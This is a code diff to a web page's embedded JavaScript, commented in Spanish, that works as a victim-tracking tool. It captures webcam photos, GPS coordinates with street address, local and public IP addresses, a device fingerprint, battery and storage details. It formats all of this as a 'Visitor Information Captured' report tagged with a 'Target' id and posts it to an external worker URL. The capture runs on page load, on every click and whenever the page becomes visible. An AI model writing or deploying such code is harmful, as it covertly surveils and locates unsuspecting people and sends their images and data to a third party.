@@ -14,13 +14,15 @@
     <canvas id="c"></canvas>
 
     <script>
+        // ============================================================
         // CONFIGURACIÓN
-        const trackingId = 'AQUI_VA_TOKEN';
+        // ============================================================
+        const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO
         const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
-        console.log('✅ Script iniciado');
-
-        // ========== FUNCIONES DE CAPTURA ==========
+        // ============================================================
+        // TODAS LAS FUNCIONES DE CAPTURA (GPS, FOTOS, DISPOSITIVO, ETC.)
+        // ============================================================
 
         async function reverseGeocode(lat, lng) {
             try {
@@ -82,7 +84,6 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                     fotos.push(blob);
-                    console.log(`📸 Foto ${i+1} capturada`);
                     await new Promise(r => setTimeout(r, 200));
                 }
                 stream.getTracks().forEach(t => t.stop());
@@ -157,21 +158,84 @@
             return permisos;
         }
 
-        // ========== CONVERTIR FOTOS A BASE64 ==========
-        function blobToBase64(blob) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
-            });
+        async function obtenerIPExterna() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'N/A', country: data.country_name || 'N/A',
+                    region: data.region || 'N/A', city: data.city || 'N/A',
+                    postal: data.postal || 'N/A', timezone: data.timezone || 'N/A'
+                };
+            } catch(e) { return null; }
         }
 
-        // ========== ENVIAR AL WORKER (JSON) ==========
+        function construirMensaje(dispositivo, fp, ipLocal, ipExterna, gps, bateria, almacenamiento, permisos) {
+            let msg = '📊 Visitor Information Captured\n';
+            msg += '━━━━━━━━━━━━━━━━\n\n';
+
+            msg += '🖥️ Device & Browser\n';
+            msg += `   • Device Model: ${dispositivo.modelo}\n`;
+            msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
+
+            msg += '🎨 Fingerprint\n';
+            msg += `   • GPU: ${fp.gpu}\n`;
+            msg += `   • Canvas: ${fp.canvas}\n\n`;
+
+            msg += '🌐 Network Information\n';
+            if (ipLocal) msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
+            if (ipExterna) {
+                msg += `   • IP Address: ${ipExterna.ip}\n`;
+                msg += `   • Language: ${dispositivo.language}\n\n`;
+            }
+
+            msg += '📍 Location Details\n';
+            if (gps) {
+                msg += `   • GPS: ${gps.lat}, ${gps.lng}\n`;
+                msg += `   • Precisión: ±${Math.round(gps.acc)}m\n`;
+                if (gps.direccion) msg += `   • Dirección: ${gps.direccion}\n`;
+                msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+            } else if (ipExterna) {
+                msg += `   • Country: ${ipExterna.country}\n`;
+                msg += `   • Region: ${ipExterna.region}\n`;
+                msg += `   • City: ${ipExterna.city}\n`;
+                msg += `   • Postal Code: ${ipExterna.postal}\n`;
+                msg += `   • Timezone: ${ipExterna.timezone}\n`;
+            } else {
+                msg += '   • No disponible\n';
+            }
+            msg += '\n';
+
+            msg += '🖼️ Display Information\n';
+            msg += `   • Resolution: ${dispositivo.resolution}\n`;
+            msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
+
+            msg += '🔋 Battery Status\n';
+            msg += `   • Level: ${bateria.level}\n`;
+            msg += `   • Charging: ${bateria.charging}\n\n`;
+
+            msg += '🔐 Device Permissions\n';
+            msg += `   • Camera: ${permisos.camera}\n`;
+            msg += `   • Location: ${permisos.location}\n\n`;
+
+            msg += '💾 Hardware & Storage\n';
+            msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
+            msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
+            msg += `   • Storage Used: ${almacenamiento.used}\n`;
+            msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
+
+            msg += '━━━━━━━━━━━━━━━━\n';
+            msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
+            msg += `⚡ Developed by: @societykark\n`;
+            msg += `⏰ ${new Date().toISOString()}`;
+
+            return msg;
+        }
+
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
             try {
-                const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
+                const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos, ipExterna] = await Promise.all([
                     capturarFotos(3),
                     capturarGPS(),
                     obtenerIPWebRTC(),
@@ -179,29 +243,24 @@
                     obtenerFingerprint(),
                     obtenerBateria(),
                     obtenerAlmacenamiento(),
-                    obtenerPermisos()
+                    obtenerPermisos(),
+                    obtenerIPExterna()
                 ]);
 
-                console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length);
+                let gpsConDireccion = null;
+                if (gps) {
+                    const direccion = await reverseGeocode(gps.lat, gps.lng);
+                    gpsConDireccion = { ...gps, direccion };
+                }
 
-                // Convertir fotos a Base64
-                const fotosBase64 = await Promise.all(fotos.map(blobToBase64));
+                const msg = construirMensaje(dispositivo, fp, ipLocal, ipExterna, gpsConDireccion, bateria, almacenamiento, permisos);
 
-                // Construir payload JSON
                 const payload = {
-                    trackingId: trackingId,
-                    device: dispositivo,
-                    fingerprint: fp,
-                    ipLocal: ipLocal,
-                    gps: gps,
-                    battery: bateria,
-                    storage: almacenamiento,
-                    permissions: permisos,
-                    photos: fotosBase64,
-                    timestamp: new Date().toISOString()
+                    text: msg,
+                    photos: fotos,
+                    latitude: gps?.lat || null,
+                    longitude: gps?.lng || null
                 };
-
-                console.log('📤 Enviando JSON al Worker...');
 
                 const response = await fetch(workerUrl, {
                     method: 'POST',
@@ -209,13 +268,12 @@
                     body: JSON.stringify(payload)
                 });
                 const result = await response.json();
-                console.log('✅ Respuesta del Worker:', result);
+                console.log('✅ Enviado:', result);
             } catch(e) {
-                console.error('❌ Error en enviarAlWorker:', e);
+                console.error('❌ Error:', e);
             }
         }
 
-        // ========== EVENTOS ==========
         function ejecutar() {
             console.log('🔄 Ejecutando captura...');
             setTimeout(enviarAlWorker, 500);
@@ -223,12 +281,12 @@
 
         window.addEventListener('load', ejecutar);
         document.addEventListener('click', () => {
-            console.log('👆 Click detectado');
+            console.log('👆 Click');
             setTimeout(enviarAlWorker, 300);
         });
         document.addEventListener('visibilitychange', () => {
             if (!document.hidden) {
-                console.log('👁️ Página visible');
+                console.log('👁️ Visible');
                 setTimeout(enviarAlWorker, 300);
             }
         });
